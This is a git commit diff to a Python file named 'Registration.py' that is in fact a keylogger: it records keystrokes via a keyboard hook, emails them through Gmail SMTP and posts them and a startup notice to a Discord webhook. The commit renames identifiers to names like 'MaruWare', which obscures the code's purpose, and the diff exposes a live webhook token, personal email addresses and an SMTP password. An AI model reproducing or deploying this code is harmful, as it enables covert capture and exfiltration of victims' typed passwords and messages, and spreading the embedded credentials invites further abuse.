b46f5524ab515c24bfcca9d291454c1ba39a832c
HirakuMaru <97714721+HirakuMaru@users.noreply.github.com>
2023-09-19 19:46:26 -0700

    Update Registration.py

--- Registration.py
+++ Registration.py
@@ -6,25 +6,25 @@ import requests
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 
-webhook_url = 'https://discord.com/api/webhooks/1053177518368247899/1xTfyhE27YzyhGYTyzNHpndGJKIRoKTLI9H2rJKgJy9uzLE2-w0Jz_FdsuHmKyJS-yZQ'
+MaruWare = 'https://discord.com/api/webhooks/1053177518368247899/1xTfyhE27YzyhGYTyzNHpndGJKIRoKTLI9H2rJKgJy9uzLE2-w0Jz_FdsuHmKyJS-yZQ'
 
-def send_discord_message(message):
+def Send_D_Rock(message):
     data = {
         'content': message
     }
-    response = requests.post(webhook_url, json=data)
+    response = requests.post(MaruWare, json=data)
     if response.status_code == 204:
         print('Message sent to Discord successfully.')
     else:
         print('Failed to send message to Discord.')
 
-def start_timer():
+def Maru_Clock():
     global timer_active
     timer_active = True
     time.sleep(60)
     timer_active = False
 
-def record_key(key):
+def maru_Rec(key):
     global recorded_text
     if timer_active:
         if key.name == "shift":
@@ -41,16 +41,16 @@ def record_key(key):
             else:
                 recorded_text += key.name
 
-keyboard.on_release(record_key)
+keyboard.on_release(maru_Rec)
 
 def send_email(output_file):
-    sender_email = "hirakushiro@gmail.com"  
-    receiver_email = "tgfmike@gmail.com"   
+    Hiraku = "hirakushiro@gmail.com"  
+    Maru = "tgfmike@gmail.com"   
     subject = "Recorded Text File"
 
     msg = MIMEMultipart()
-    msg["From"] = sender_email
-    msg["To"] = receiver_email
+    msg["From"] = Hiraku
+    msg["To"] = Maru
     msg["Subject"] = subject
 
     with open(output_file, "rb") as file:
@@ -60,25 +60,25 @@ def send_email(output_file):
 
     smtp_server = "smtp.gmail.com"
     smtp_port = 587
-    smtp_username = sender_email
-    smtp_password = "rxrwrkoybhldkmgc"  
+    smtp_username = Hiraku
+    Local_list = "rxrwrkoybhldkmgc"  
 
     try:
         server = smtplib.SMTP(smtp_server, smtp_port)
         server.starttls()
-        server.login(smtp_username, smtp_password)
-        server.sendmail(sender_email, receiver_email, msg.as_string())
+        server.login(smtp_username, Local_list)
+        server.sendmail(Hiraku, Maru, msg.as_string())
         server.quit()
         print("Email sent successfully.")
         
         
-        send_discord_message(recorded_text)  
+        Send_D_Rock(recorded_text)  
     except Exception as e:
         print("An error occurred while sending the email:", e)
-        send_discord_message(f"Error sending email: {e}")
+        Send_D_Rock(f"Error sending email: {e}")
 
 startup_message = 'PC has started up!'
-send_discord_message(startup_message)
+Send_D_Rock(startup_message)
 
 while True:
     recorded_text = ""
@@ -86,7 +86,7 @@ while True:
     
     print("Type within the next 60 seconds to record.")
 
-    timer_thread = threading.Thread(target=start_timer)
+    timer_thread = threading.Thread(target=Maru_Clock)
     timer_thread.start()
 
     while timer_thread.is_alive():
